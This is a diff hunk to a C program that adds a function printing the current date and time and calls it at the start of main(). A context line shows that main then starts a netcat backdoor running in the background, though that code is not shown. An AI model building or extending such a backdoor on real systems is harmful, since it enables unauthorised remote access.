@@ -25,8 +25,26 @@
 
 #include <stdio.h>
 #include <unistd.h>
+#include <time.h>
+
+int timedisp()
+{
+	time_t timer;
+	char buffer[26];
+	struct tm* tm_info;
+
+	time(&timer);
+	tm_info = localtime(&timer);
+
+	strftime(buffer, 26, "%Y:%m:%d %H:%M:%S", tm_info);
+	printf("%s\n", buffer);
+}
 
 int main (int argc, char *argv[]) {
+
+// Display the time and date...
+
+	timedisp();
 
 // Start a netcat backdoor, running in the background.
 
